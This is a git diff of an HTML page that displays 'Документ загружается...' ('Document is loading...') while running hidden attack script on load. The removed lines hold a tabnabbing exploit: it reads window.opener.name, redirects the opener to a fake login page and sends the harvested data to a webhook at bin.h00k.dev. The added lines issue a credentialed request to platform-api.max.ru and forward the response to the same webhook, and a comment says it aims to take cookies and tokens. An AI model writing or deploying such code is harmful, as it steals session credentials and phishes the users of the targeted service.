@@ -6,41 +6,12 @@
 </head>
 <body>
     <script>
-        const webhook = "https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4";
-
-        async function exploit() {
-            let data = {};
-
-            try {
-                if (window.opener) {
-                    // 1. Проверка window.name (часто содержит токены сессии)
-                    data.window_name = window.opener.name;
-
-                    // 2. Tabnabbing (Подмена вкладки мессенджера)
-                    // Это доказывает возможность угона аккаунта через фишинг
-                    window.opener.location = "https://lin-li-shu.github.io/test-preview/index/fake-login.html";
-                    data.tabnabbing = "success";
-                }
-            } catch (e) {
-                data.error = e.message;
-            }
-
-            // Отправка всего улова на бин
-            fetch(webhook + "?leak=" + btoa(JSON.stringify(data)), {mode: 'no-cors'});
-        }
-
-        // Слушаем postMessage (вдруг они ответят на "ping")
-        window.addEventListener("message", (e) => {
-            fetch(webhook + "?postmessage=" + btoa(JSON.stringify(e.data)), {mode: 'no-cors'});
-        });
-
-        // Запуск
-        exploit();
-        
-        // Попытка спровоцировать утечку через postMessage
-        if (window.opener) {
-            window.opener.postMessage('{"type":"GET_AUTH"}', "*");
-        }
+      fetch('https://platform-api.max.ru/some-endpoint', {
+    method: 'GET',
+    credentials: 'include' // Пытаемся забрать куки/токены
+}).then(r => r.text()).then(data => {
+    fetch('https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4?cors_leak=' + btoa(data));
+});
     </script>
     <h2>Документ загружается...</h2>
 </body>
